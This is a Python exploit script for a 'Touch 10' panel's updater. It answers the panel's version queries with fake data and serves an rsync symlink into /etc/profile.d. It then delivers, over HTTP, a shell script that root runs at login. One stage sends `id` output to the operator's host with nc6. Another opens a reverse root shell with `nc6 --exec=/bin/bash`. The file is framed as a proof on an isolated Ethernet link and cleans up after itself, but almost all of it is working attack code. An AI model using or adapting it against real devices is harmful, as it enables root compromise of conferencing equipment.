#!/usr/bin/env python3
"""Stage the Touch 10 updater symlink proof on an isolated Ethernet link.

Run one stage at a time: rsync, then either http/proof for a UID check or
shell for a temporary root session. No firmware package is served.
"""

import argparse
from datetime import datetime, timezone
import json
from pathlib import Path
import selectors
import signal
import socket
import subprocess
import threading
import time


TARGET_PATH = "/etc/profile.d/zz_touch10_upgrade_probe"
TARGETS = "102300-3,102310-0,102310-1,101282-0"
RUNNING_VERSION = "ce9.9.0 46f7ea38fda 2019-10-10"
PROBE_VERSION = "ce9.9.0 upgrade-probe 2026-11-07"


def listen(address, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((address, port))
    sock.listen(8)
    sock.setblocking(False)
    return sock


def payload(host_ip, stage):
    if stage == "shell":
        return (
            "# Touch 10 temporary root session; sourced by /etc/profile.\n"
            "if [ \"$(id -u)\" = 0 ] && [ ! -e /tmp/touch10-shell-active ]; then\n"
            "    : > /tmp/touch10-shell-active\n"
            f"    nc6 -n --exec=/bin/bash -w 5 {host_ip} 8876 2>/tmp/touch10-shell-error\n"
            "    rm -f /upgrade/pkg /etc/profile.d/zz_touch10_upgrade_probe"
            " /tmp/touch10-shell-active\n"
            "fi\n"
        ).encode("ascii")
    return (
        "# Touch 10 volatile root proof; sourced by /etc/profile.\n"
        "if [ \"$(id -u)\" = 0 ] && [ ! -e /tmp/touch10-upgrade-proof.sent ]; then\n"
        "    id > /tmp/touch10-upgrade-proof\n"
        "    if { printf 'TOUCH10_UPGRADE_PROOF '; id; } | "
        f"nc6 -n --send-only -w 5 {host_ip} 8875 >/dev/null 2>&1; then\n"
        "        : > /tmp/touch10-upgrade-proof.sent\n"
        "        rm -f /upgrade/pkg /etc/profile.d/zz_touch10_upgrade_probe\n"
        "    fi\n"
        "fi\n"
    ).encode("ascii")


def version_info(stage, host_ip):
    if stage == "rsync":
        method, url, version = "rsync", f"rsync://{host_ip}:8873/probe/link", PROBE_VERSION
    elif stage in ("http", "shell"):
        method, url, version = "http", f"http://{host_ip}:8874/probe", PROBE_VERSION
    else:
        method, url, version = "none", "", RUNNING_VERSION
    return (f"version: {version}\nmethod: {method}\nurl: {url}\n"
            f"targets: {TARGETS}\n").encode("ascii")


def start_rsync(state_dir, host_ip):
    source = state_dir / "rsync"
    source.mkdir(parents=True, exist_ok=True)
    link = source / "link"
    link.unlink(missing_ok=True)
    link.symlink_to(TARGET_PATH)
    config = state_dir / "rsyncd.conf"
    config.write_text(
        f"port = 8873\nuse chroot = no\nread only = yes\n"
        f"pid file = {state_dir / 'rsyncd.pid'}\n"
        f"log file = {state_dir / 'rsyncd.log'}\n"
        f"[probe]\npath = {source}\n"
    )
    return subprocess.Popen(
        ["rsync", "--daemon", "--no-detach", f"--config={config}",
         f"--address={host_ip}", "--port=8873"],
        stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
    )


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--stage", choices=("rsync", "http", "proof", "shell"), required=True)
    parser.add_argument("--host-ip", default="10.77.10.1")
    parser.add_argument("--target-ip", default="10.77.10.10")
    parser.add_argument("--seconds", type=int, default=180)
    parser.add_argument("--state-dir", type=Path, default=Path("/tmp/touch10-upgrade-probe"))
    parser.add_argument("--log", type=Path, required=True)
    args = parser.parse_args()
    if not 1 <= args.seconds <= 900:
        parser.error("--seconds must be 1..900")
    args.state_dir.mkdir(parents=True, exist_ok=True)
    args.log.parent.mkdir(parents=True, exist_ok=True)
    selector = selectors.DefaultSelector()
    daemon = None
    events = []
    stop = threading.Event()
    signal.signal(signal.SIGINT, lambda _signum, _frame: stop.set())
    signal.signal(signal.SIGTERM, lambda _signum, _frame: stop.set())
    response = version_info(args.stage, args.host_ip)
    proof = payload(args.host_ip, args.stage)
    try:
        for port in (4045, 4046):
            selector.register(listen(args.host_ip, port), selectors.EVENT_READ, ("info", port))
        if args.stage in ("http", "shell"):
            selector.register(listen(args.host_ip, 8874), selectors.EVENT_READ, ("http", 8874))
        if args.stage == "proof":
            selector.register(listen(args.host_ip, 8875), selectors.EVENT_READ, ("proof", 8875))
        if args.stage == "rsync":
            daemon = start_rsync(args.state_dir, args.host_ip)
            time.sleep(0.15)
            if daemon.poll() is not None:
                raise RuntimeError(f"rsync daemon exited {daemon.returncode}: "
                                   f"{daemon.stderr.read().decode(errors='replace')[-300:]}")
        print(f"{args.stage} stage ready on {args.host_ip}; expected panel {args.target_ip}", flush=True)
        deadline = time.monotonic() + args.seconds
        while not stop.is_set() and time.monotonic() < deadline:
            for key, _ in selector.select(min(0.5, deadline - time.monotonic())):
                listener = key.fileobj
                kind, port = key.data
                connection, peer = listener.accept()
                with connection:
                    event = {"utc": datetime.now(timezone.utc).isoformat(),
                             "stage": args.stage, "kind": kind, "port": port,
                             "peer": peer[0]}
                    if peer[0] != args.target_ip:
                        event["result"] = "ignored_other_peer"
                    else:
                        connection.settimeout(3)
                        try:
                            if kind == "info":
                                connection.sendall(response)
                                event["result"] = "version_info_sent"
                            elif kind == "http":
                                request = connection.recv(4096)
                                event["request_line"] = request.split(b"\r\n", 1)[0].decode("ascii", errors="replace")[:160]
                                if request.startswith(b"GET /probe "):
                                    connection.sendall(
                                        b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n"
                                        + f"Content-Length: {len(proof)}\r\nConnection: close\r\n\r\n".encode("ascii")
                                        + proof
                                    )
                                    event["result"] = ("volatile_shell_script_sent" if args.stage == "shell"
                                                       else "volatile_id_probe_sent")
                                else:
                                    connection.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
                                    event["result"] = "not_found"
                            else:
                                chunks = []
                                total = 0
                                while total < 4096:
                                    try:
                                        chunk = connection.recv(4096 - total)
                                    except TimeoutError:
                                        break
                                    if not chunk:
                                        break
                                    chunks.append(chunk)
                                    total += len(chunk)
                                data = b"".join(chunks)
                                event["proof"] = data.decode("ascii", errors="replace")[:4096]
                                event["result"] = ("root_proof_received" if b"uid=0(" in data
                                                   else "incomplete_proof")
                        except OSError as error:
                            event["result"] = f"{type(error).__name__}: {error}"
                    events.append(event)
                    print(json.dumps(event), flush=True)
                    if kind == "proof" and event.get("result") == "root_proof_received":
                        return
    finally:
        for key in list(selector.get_map().values()):
            selector.unregister(key.fileobj)
            key.fileobj.close()
        selector.close()
        if daemon is not None and daemon.poll() is None:
            daemon.terminate()
            try:
                daemon.wait(timeout=3)
            except subprocess.TimeoutExpired:
                daemon.kill()
                daemon.wait()
        args.log.write_text(json.dumps({"stage": args.stage, "events": events,
                                        "firmware_package_served": False}, indent=2) + "\n")


if __name__ == "__main__":
    main()
